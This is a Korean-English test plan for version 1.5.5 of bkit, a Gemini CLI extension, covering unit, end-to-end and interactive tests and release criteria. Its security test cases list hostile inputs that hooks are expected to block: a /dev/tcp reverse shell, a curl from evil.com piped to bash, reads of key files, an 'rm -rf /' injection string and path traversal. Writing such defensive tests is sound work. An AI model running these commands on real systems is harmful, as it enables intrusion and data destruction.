# Plan: bkit v1.5.5 Comprehensive Gemini CLI Test

> **Feature**: bkit-v155-gemini-test
> **Date**: 2026-02-25
> **Version**: bkit-gemini v1.5.5
> **Author**: CTO Team
> **Status**: Approved
> **Method**: PDCA Plan (Full-scope Test)
> **Related**: gemini-cli-030-migration (v1.5.5 implementation complete, 100% match rate)

---

## 1. Test Objectives

### 1.1 Why This Test Plan?

bkit v1.5.5에서 11개 변경사항(V155-01~V155-11)을 구현했다. Gap 분석으로 설계-구현 일치율은 100% 검증되었지만, 이는 **코드가 설계서대로 작성되었는지**를 확인한 것이다. 이제 필요한 것은:

1. **변경된 코드가 실제로 동작하는가?** (Unit Test)
2. **변경이 기존 기능을 깨뜨리지 않았는가?** (Regression Test)
3. **전체 PDCA 워크플로우가 정상 동작하는가?** (E2E Test)
4. **실제 Gemini CLI에서 사용자 경험이 정상인가?** (UX Test)

### 1.2 Test Scope

| Category | Count | Coverage Goal |
|----------|:-----:|:------------:|
| v1.5.5 변경사항 검증 | 11 items | 100% |
| Agents (16개) | 16 | 100% loading + 4 model change verify |
| Skills (29개) | 29 | 100% loading + activation |
| Hooks (9개) | 9 | 100% execution + I/O |
| TOML Commands (18개) | 18 | 100% parsing + execution |
| Lib Modules (36개) | 36 | Critical path 100% |
| MCP Server (16 tools) | 16 | Registration + 2 execution |
| PDCA E2E Flow | 6 phases | Full cycle |
| User Experience | 12 scenarios | Interactive verification |

---

## 2. Test Strategy

### 2.1 Three-Layer Testing

```
Layer 3: UX Test (Gemini CLI Interactive)
  └─ 실제 gemini CLI에서 사용자 시나리오 실행
  └─ 12 interactive scenarios
  └─ 수동 실행, PASS/FAIL 판정

Layer 2: E2E Test (node tests/run-all.js)
  └─ 17개 test suite, TC01~TC17
  └─ Hook → Skill → Agent → PDCA 전체 흐름
  └─ 자동 실행, exit code 판정

Layer 1: Unit Test (개별 모듈)
  └─ lib/ 모듈 단위 함수 테스트
  └─ 변경된 파일 집중 테스트
  └─ 자동 실행, assert 판정
```

### 2.2 Priority Classification

| Priority | Description | Criteria |
|:--------:|------------|----------|
| **P0** | Release Blocker | v1.5.5 변경사항 + 핵심 기능. 실패 시 릴리즈 불가 |
| **P1** | High Priority | 기존 기능 regression. 실패 시 수정 후 릴리즈 |
| **P2** | Medium | 부가 기능, 문서, 스타일. 실패 시 known issue로 릴리즈 가능 |

---

## 3. Unit Tests - v1.5.5 변경사항 검증 (P0)

### 3.1 V155-03: version-detector.js

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-01 | isValidSemVer 정상 버전 | `"0.30.0"` | `true` | P0 |
| UT-02 | isValidSemVer preview 버전 | `"0.30.0-preview.3"` | `true` | P0 |
| UT-03 | isValidSemVer 잘못된 형식 | `"abc"` | `false` | P0 |
| UT-04 | isValidSemVer 주입 시도 | `"99.99.99; rm -rf /"` | `false` | P0 |
| UT-05 | isVersionBeyondPlausible 정상 범위 | `"0.30.0"` | `false` | P0 |
| UT-06 | isVersionBeyondPlausible 초과 범위 | `"3.0.0"` | `true` | P0 |
| UT-07 | env var 검증 - 유효 | `GEMINI_CLI_VERSION=0.30.0` | raw = `"0.30.0"` | P0 |
| UT-08 | env var 검증 - 무효 | `GEMINI_CLI_VERSION=99.99.99` | raw = `null` (무시) | P0 |
| UT-09 | hasGemini31Pro 플래그 (v0.29.7) | version `0.29.7` | `true` | P0 |
| UT-10 | hasGemini31Pro 플래그 (v0.29.0) | version `0.29.0` | `false` | P0 |
| UT-11 | hasApprovalMode 플래그 (v0.30.0) | version `0.30.0` | `true` | P0 |
| UT-12 | hasApprovalMode 플래그 (v0.29.7) | version `0.29.7` | `false` | P0 |

### 3.2 V155-06: policy-migrator.js

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-13 | escapeTomlString 백슬래시 | `'path\\to'` | `'path\\\\to'` | P0 |
| UT-14 | escapeTomlString 따옴표 | `'say "hello"'` | `'say \\"hello\\"'` | P0 |
| UT-15 | escapeTomlString 개행 | `'line1\nline2'` | `'line1\\nline2'` | P0 |
| UT-16 | validateTomlStructure 정상 | Valid TOML with rules | `true` | P0 |
| UT-17 | validateTomlStructure 룰 없음 | TOML without `[[rule]]` | `false` | P0 |
| UT-18 | validateTomlStructure 불일치 | 2 rules, 1 decision | `false` | P0 |
| UT-19 | generatePolicyFile 버전 가드 (< 0.30) | CLI v0.29.0 | `{ created: false, reason: 'version' }` | P0 |
| UT-20 | generatePolicyFile 정상 생성 (>= 0.30) | CLI v0.30.0 + permissions | TOML file created | P0 |
| UT-21 | generatePolicyFile 기존 파일 보존 | Existing TOML | `{ created: false }` | P0 |
| UT-22 | convertToToml 이스케이핑 적용 | `run_shell_command("rm -rf")` | `toolName = "run_shell_command"` escaped | P0 |

### 3.3 V155-05: spawn-agent-server.js

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-23 | approval flag v0.30.0 | CLI >= 0.30.0 | `--approval-mode=yolo` | P0 |
| UT-24 | approval flag v0.29.x | CLI < 0.30.0 | `--yolo` | P0 |
| UT-25 | team_name 정상 | `"my-team"` | Accepted | P0 |
| UT-26 | team_name path traversal | `"../../etc"` | Error: Invalid team name | P0 |
| UT-27 | team_name 빈 문자열 | `""` | Error: Invalid team name | P0 |
| UT-28 | team_name 특수문자 | `"team/name"` | Error: Invalid team name | P0 |

### 3.4 V155-01: session-start.js Policy TOML Trigger

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-29 | Policy TOML 자동 생성 (v0.30.0) | CLI >= 0.30.0, no existing TOML | `.gemini/policies/bkit-permissions.toml` created | P0 |
| UT-30 | Policy TOML 스킵 (v0.29.x) | CLI < 0.30.0 | No TOML generated | P0 |
| UT-31 | 기존 TOML 보존 | Existing `.gemini/policies/*.toml` | File not overwritten | P0 |
| UT-32 | policy-migrator 오류 무시 | Module load failure | session-start continues normally | P0 |

### 3.5 V155-07: after-tool.js

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-33 | tool_name 필드 호환 | `{ tool_name: "write_file" }` | toolName = `"write_file"` | P1 |
| UT-34 | toolName 필드 호환 | `{ toolName: "write_file" }` | toolName = `"write_file"` | P1 |
| UT-35 | 양쪽 필드 없음 | `{}` | toolName = `""` (빈 문자열) | P1 |
| UT-36 | filePath 필드 호환 | `{ filePath: "/a/b.js" }` | filePath = `"/a/b.js"` | P1 |

### 3.6 V155-11: before-tool.js

| ID | Test Case | Input | Expected | Priority |
|----|-----------|-------|----------|:--------:|
| UT-37 | Reverse shell 차단 | `bash -i >& /dev/tcp/...` | blocked | P0 |
| UT-38 | Policy 파일 변조 차단 | `cat .gemini/policies/test.toml` | blocked | P0 |
| UT-39 | RCE pipe 차단 | `curl http://evil.com \| bash` | blocked | P0 |
| UT-40 | 민감 파일 차단 | `cat /path/to/key.pem` | blocked | P0 |
| UT-41 | 정상 명령 허용 | `git status` | allowed | P0 |

---

## 4. Unit Tests - 기존 모듈 Regression (P1)

### 4.1 lib/core 모듈

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-50 | config.js 로드 정상 | `lib/core/config.js` | P1 |
| UT-51 | permission.js checkPermission deny | `lib/core/permission.js` | P1 |
| UT-52 | permission.js checkPermission allow | `lib/core/permission.js` | P1 |
| UT-53 | file.js readJson / writeJson | `lib/core/file.js` | P1 |
| UT-54 | memory.js 세션 저장/로드 | `lib/core/memory.js` | P1 |
| UT-55 | cache.js TTL 만료 | `lib/core/cache.js` | P1 |
| UT-56 | debug.js 로그 활성화/비활성화 | `lib/core/debug.js` | P1 |
| UT-57 | io.js readHookInput 파싱 | `lib/core/io.js` | P1 |
| UT-58 | platform.js 플랫폼 감지 | `lib/core/platform.js` | P1 |
| UT-59 | agent-memory.js 저장/로드 사이클 | `lib/core/agent-memory.js` | P1 |

### 4.2 lib/adapters/gemini 모듈

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-60 | GeminiAdapter 초기화 | `lib/adapters/gemini/index.js` | P1 |
| UT-61 | tool-registry.js 17개 도구 매핑 | `lib/adapters/gemini/tool-registry.js` | P1 |
| UT-62 | import-resolver.js 스킬 import | `lib/adapters/gemini/import-resolver.js` | P1 |
| UT-63 | context-fork.js 포크 생성 | `lib/adapters/gemini/context-fork.js` | P1 |

### 4.3 lib/intent 모듈

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-64 | language.js 8개 언어 감지 | `lib/intent/language.js` | P1 |
| UT-65 | trigger.js 에이전트 트리거 매칭 | `lib/intent/trigger.js` | P1 |
| UT-66 | ambiguity.js 모호성 감지 | `lib/intent/ambiguity.js` | P1 |

### 4.4 lib/pdca 모듈

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-67 | level.js 프로젝트 레벨 감지 | `lib/pdca/level.js` | P1 |
| UT-68 | phase.js 페이즈 전환 | `lib/pdca/phase.js` | P1 |
| UT-69 | status.js PDCA 상태 읽기/쓰기 | `lib/pdca/status.js` | P1 |
| UT-70 | automation.js 자동 트리거 | `lib/pdca/automation.js` | P1 |
| UT-71 | tier.js 티어 분류 | `lib/pdca/tier.js` | P1 |

### 4.5 lib/task 모듈

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-72 | classification.js 태스크 분류 | `lib/task/classification.js` | P1 |
| UT-73 | creator.js 태스크 생성 | `lib/task/creator.js` | P1 |
| UT-74 | dependency.js 의존성 관리 | `lib/task/dependency.js` | P1 |
| UT-75 | tracker.js 진행률 추적 | `lib/task/tracker.js` | P1 |

### 4.6 lib/skill-orchestrator.js + context-hierarchy.js

| ID | Test Case | Module | Priority |
|----|-----------|--------|:--------:|
| UT-76 | skill-orchestrator.js YAML 파싱 | `lib/skill-orchestrator.js` | P1 |
| UT-77 | skill-orchestrator.js import 해석 | `lib/skill-orchestrator.js` | P1 |
| UT-78 | context-hierarchy.js 계층 구성 | `lib/context-hierarchy.js` | P1 |

---

## 5. E2E Tests - 전체 워크플로우 (P0~P1)

### 5.1 기존 Test Suites (node tests/run-all.js)

| Suite | Name | Tests | Priority | v1.5.5 연관 |
|-------|------|:-----:|:--------:|:-----------:|
| TC-01 | Hook System | ~15 | P0 | V155-01,07,11 변경 |
| TC-02 | Skill System | ~29 | P0 | 전체 스킬 로딩 검증 |
| TC-03 | Agent System | ~16 | P1 | V155-08,09 모델 변경 |
| TC-04 | Lib Modules | ~36 | P0 | V155-03,06 변경 |
| TC-05 | MCP Server | ~16 | P1 | V155-05 변경 |
| TC-06 | TOML Commands | ~18 | P1 | 명령어 파싱 |
| TC-07 | Configuration | ~10 | P1 | V155-02,10 변경 |
| TC-08 | Context Engineering | ~8 | P1 | - |
| TC-09 | PDCA E2E | ~12 | P0 | 전체 PDCA 사이클 |
| TC-10 | Philosophy | ~5 | P2 | - |
| TC-11 | Output Styles | ~8 | P1 | - |
| TC-12 | Agent Memory | ~6 | P1 | - |
| TC-13 | Automation | ~10 | P0 | 의도 감지, 자동 트리거 |
| TC-14 | bkend Skills | ~8 | P2 | - |
| TC-15 | Feature Report | ~5 | P2 | - |
| TC-16 | v0.30 Phase 1 | 21 | P0 | V155-01~05 직접 검증 |
| TC-17 | v0.30 Phase 2 | 11 | P1 | V155-06~11 직접 검증 |

**Total automated tests: ~224 cases**

### 5.2 v1.5.5 Specific E2E Flows

| ID | Flow | Steps | Priority |
|----|------|-------|:--------:|
| E2E-01 | Policy TOML 전체 흐름 | session-start → version-detector → policy-migrator → TOML file check | P0 |
| E2E-02 | Sub-agent 스폰 흐름 | team_create (sanitized name) → team_assign → executeAgent (approval flag) | P0 |
| E2E-03 | PDCA Full Cycle | plan → design → do → analyze → report | P0 |
| E2E-04 | Hook Chain (write_file) | before-tool-selection → before-tool → [write] → after-tool | P1 |
| E2E-05 | Hook Chain (shell command) | before-tool → [blocked pattern] → exit | P1 |
| E2E-06 | Agent 로딩 전체 | 16개 에이전트 MD 파싱 → model 필드 확인 → tool 존재 확인 | P1 |
| E2E-07 | Skill 로딩 전체 | 29개 SKILL.md 파싱 → frontmatter 검증 → import 해석 | P1 |
| E2E-08 | Config Consistency | bkit.config.json ↔ gemini-extension.json ↔ CHANGELOG 버전 일치 | P0 |

---

## 6. Interactive Gemini CLI Tests - 사용자 경험 (P1~P2)

### 6.1 세션 시작 시나리오

| ID | Scenario | Gemini CLI Input | Expected | Priority |
|----|----------|-----------------|----------|:--------:|
| UX-01 | 첫 세션 시작 | `gemini` (새 프로젝트) | Welcome 메시지, 레벨 감지, AskUserQuestion | P1 |
| UX-02 | 돌아온 사용자 | `gemini` (기존 PDCA 진행중) | Previous Work Detected, 이전 feature/phase 표시 | P1 |
| UX-03 | 한국어 인식 | `로그인 기능 만들어줘` | Dynamic 스킬 또는 bkend-expert 트리거 | P1 |
| UX-04 | 영어 인식 | `Help me build a landing page` | starter-guide 트리거 | P1 |

### 6.2 PDCA 워크플로우 시나리오

| ID | Scenario | Gemini CLI Input | Expected | Priority |
|----|----------|-----------------|----------|:--------:|
| UX-05 | Plan 생성 | `/pdca plan test-feature` | Plan 문서 생성, docs/01-plan/ 확인 | P1 |
| UX-06 | Design 생성 | `/pdca design test-feature` | Design 문서 생성, Plan 참조 | P1 |
| UX-07 | Status 확인 | `/pdca status` | 현재 feature, phase, progress 표시 | P1 |
| UX-08 | Next 안내 | `/pdca next` | 다음 단계 명확한 안내 | P1 |

### 6.3 Agent/Skill 사용 시나리오

| ID | Scenario | Gemini CLI Input | Expected | Priority |
|----|----------|-----------------|----------|:--------:|
| UX-09 | 코드 리뷰 요청 | `/code-review` or `코드 분석해줘` | code-analyzer 활성화 | P2 |
| UX-10 | 보안 검토 | `보안 취약점 점검해줘` | security-architect 트리거 | P2 |
| UX-11 | 파이프라인 안내 | `/development-pipeline` | 9 Phase 안내 | P2 |
| UX-12 | bkit 도움말 | `/bkit` | 전체 기능 목록 표시 | P2 |

### 6.4 v1.5.5 변경사항 UX 검증

| ID | Scenario | Gemini CLI Input | Expected | Priority |
|----|----------|-----------------|----------|:--------:|
| UX-13 | Model 변경 확인 | `/pdca team test` 실행 후 CTO agent 확인 | cto-lead가 gemini-3.1-pro 사용 | P1 |
| UX-14 | Feature Report 포함 | 아무 질문 | 응답 끝에 Feature Usage Report 포함 | P1 |
| UX-15 | 위험 명령 차단 | `rm -rf /` 실행 시도 | before-tool에서 차단 | P1 |
| UX-16 | Policy TOML 생성 확인 | 세션 시작 후 `.gemini/policies/` 확인 | v0.30.0에서 TOML 자동 생성 | P1 |

---

## 7. Execution Plan

### 7.1 테스트 실행 순서

```
Phase 1: Unit Tests (자동)
  └─ node tests/run-all.js
  └─ 17 suites, ~224 test cases
  └─ 예상 소요: 2~3분
  └─ Pass Criteria: P0 suites 100% pass

Phase 2: v1.5.5 Targeted Tests (자동)
  └─ TC-16 (v0.30 Phase 1): 21 cases
  └─ TC-17 (v0.30 Phase 2): 11 cases
  └─ 예상 소요: 1분
  └─ Pass Criteria: 100% pass

Phase 3: Interactive UX Tests (수동, Gemini CLI)
  └─ UX-01 ~ UX-16: 16 scenarios
  └─ 실제 gemini CLI에서 실행
  └─ 예상 소요: 30~60분
  └─ Pass Criteria: P1 scenarios 100% pass
```

### 7.2 환경 요구사항

| 항목 | 요구사항 |
|------|---------|
| Node.js | >= 18.0.0 |
| Gemini CLI | v0.29.x 또는 v0.30.0 (양쪽 테스트) |
| OS | macOS (darwin) |
| Branch | `feature/v1.5.5` |
| 환경변수 | `GEMINI_CLI_VERSION` (Unit Test용 오버라이드) |

### 7.3 테스트 실행 명령어

```bash
# Phase 1: 전체 자동 테스트
cd /Users/popup-kay/Documents/GitHub/popup/bkit-gemini
node tests/run-all.js

# Phase 2: v1.5.5 특화 테스트
node -e "require('./tests/suites/tc16-v030-phase1.js')"
node -e "require('./tests/suites/tc17-v030-phase2.js')"

# Phase 3: Interactive (Gemini CLI에서)
cd /tmp/bkit-test-project
gemini
# → UX-01 ~ UX-16 시나리오 순서대로 실행
```

---

## 8. Pass/Fail Criteria

### 8.1 릴리즈 판정 기준

| Level | Criteria | Action |
|-------|----------|--------|
| **GREEN** (릴리즈) | P0 100% pass + P1 90% pass | 즉시 릴리즈 |
| **YELLOW** (조건부) | P0 100% pass + P1 < 90% | P1 실패 항목 확인 후 판단 |
| **RED** (차단) | P0 < 100% | 수정 후 재테스트 |

### 8.2 수치 목표

| Metric | Target |
|--------|--------|
| Unit Test Pass Rate | >= 95% (P0: 100%) |
| E2E Test Pass Rate | >= 90% (P0: 100%) |
| UX Test Pass Rate | >= 90% (P1: 100%) |
| Regression Count | 0 (P0 영역) |
| v1.5.5 변경사항 검증 | 100% (42 test cases) |

---

## 9. Test Case Summary

| Category | P0 | P1 | P2 | Total |
|----------|:--:|:--:|:--:|:-----:|
| UT: v1.5.5 Changes | 32 | 4 | 0 | 36 |
| UT: Lib Regression | 0 | 29 | 0 | 29 |
| E2E: Test Suites | ~88 | ~116 | ~20 | ~224 |
| E2E: v1.5.5 Flows | 4 | 4 | 0 | 8 |
| UX: Interactive | 0 | 12 | 4 | 16 |
| **Total** | **~124** | **~165** | **~24** | **~313** |

---

## 10. Risk & Mitigation

| Risk | Impact | Mitigation |
|------|--------|------------|
| Gemini CLI v0.30.0 미설치 | Policy TOML, approval-mode 테스트 불가 | `GEMINI_CLI_VERSION=0.30.0` env var 모킹 |
| MCP server 포트 충돌 | TC-05 실패 | 테스트용 포트 할당 |
| 네트워크 불안정 | Agent 스폰 타임아웃 | 로컬 모킹 + 타임아웃 조정 |
| Interactive 테스트 주관성 | Pass/Fail 판정 모호 | 명확한 Expected 결과 정의 |

---

## Appendix: File-to-Test Mapping (v1.5.5 변경 파일)

| File | Changed In | Unit Tests | E2E Tests |
|------|-----------|:----------:|:---------:|
| `lib/adapters/gemini/version-detector.js` | V155-03 | UT-01~12 | TC-04, TC-16 |
| `lib/adapters/gemini/policy-migrator.js` | V155-06 | UT-13~22 | TC-04, TC-16 |
| `hooks/scripts/session-start.js` | V155-01 | UT-29~32 | TC-01, TC-16 |
| `mcp/spawn-agent-server.js` | V155-05 | UT-23~28 | TC-05, TC-16 |
| `hooks/scripts/after-tool.js` | V155-07 | UT-33~36 | TC-01, TC-17 |
| `hooks/scripts/before-tool.js` | V155-11 | UT-37~41 | TC-01, TC-17 |
| `bkit.config.json` | V155-02 | - | TC-07, E2E-08 |
| `agents/cto-lead.md` | V155-08 | - | TC-03, E2E-06 |
| `agents/gap-detector.md` | V155-08 | - | TC-03, E2E-06 |
| `agents/report-generator.md` | V155-09 | - | TC-03, E2E-06 |
| `agents/qa-monitor.md` | V155-09 | - | TC-03, E2E-06 |
| `gemini-extension.json` | V155-10 | - | TC-07, E2E-08 |
| `docs/guides/model-selection.md` | V155-04 | - | - (documentation) |
| `CHANGELOG.md` | V155-11 | - | E2E-08 |

---

*Test Plan prepared by CTO Team*
*bkit Vibecoding Kit v1.5.5 Comprehensive Test Plan*
*Copyright 2024-2026 POPUP STUDIO PTE. LTD.*
